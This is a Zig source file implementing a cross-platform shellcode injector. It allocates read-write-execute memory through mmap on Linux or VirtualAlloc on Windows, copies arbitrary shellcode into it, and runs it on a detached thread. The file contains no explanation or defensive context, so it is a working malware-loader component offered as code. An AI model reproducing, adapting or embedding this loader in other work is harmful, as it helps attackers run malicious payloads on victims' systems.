// Copyright (c) 2025 il1v3y. All Rights Reserved.
// Unauthorized copying or use of this file is strictly prohibited.
// Proprietary and confidential.

const std = @import("std");
const builtin = @import("builtin");
const os = if (@hasDecl(std, "posix")) std.posix else os;

pub const Injector = struct {
    pub fn inject(shellcode: []const u8) !void {
        if (builtin.os.tag == .linux) {
            try injectLinux(shellcode);
        } else if (builtin.os.tag == .windows) {
            try injectWindows(shellcode);
        } else {
            return error.UnsupportedOS;
        }
    }

    fn injectLinux(shellcode: []const u8) !void {
        const linux = std.os.linux;
        const prot = linux.PROT.READ | linux.PROT.WRITE | linux.PROT.EXEC;
        const flags = linux.MAP{
            .TYPE = .PRIVATE,
            .ANONYMOUS = true,
        };
        
        // Allocate RWX memory
        const addr = try os.mmap(null, shellcode.len, prot, flags, -1, 0);
        
        // Copy shellcode
        @memcpy(addr[0..shellcode.len], shellcode);

        const thread = try std.Thread.spawn(.{}, runShellcodeWrapper, .{ @intFromPtr(addr.ptr) });
        thread.detach();
    }

    fn injectWindows(shellcode: []const u8) !void {
        const windows = std.os.windows;
        const MEM_COMMIT = 0x00001000;
        const MEM_RESERVE = 0x00002000;
        const PAGE_EXECUTE_READWRITE = 0x40;

        const addr = try windows.VirtualAlloc(
            null,
            shellcode.len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        const dest = @as([*]u8, @ptrCast(addr));
        @memcpy(dest[0..shellcode.len], shellcode);

        const thread = try std.Thread.spawn(.{}, runShellcodeWrapper, .{ @intFromPtr(addr) });
        thread.detach();
    }

    fn runShellcodeWrapper(addr: usize) void {
        const ShellcodeFn = *const fn() callconv(.c) void;
        const func = @as(ShellcodeFn, @ptrFromInt(addr));
        func();
    }
};
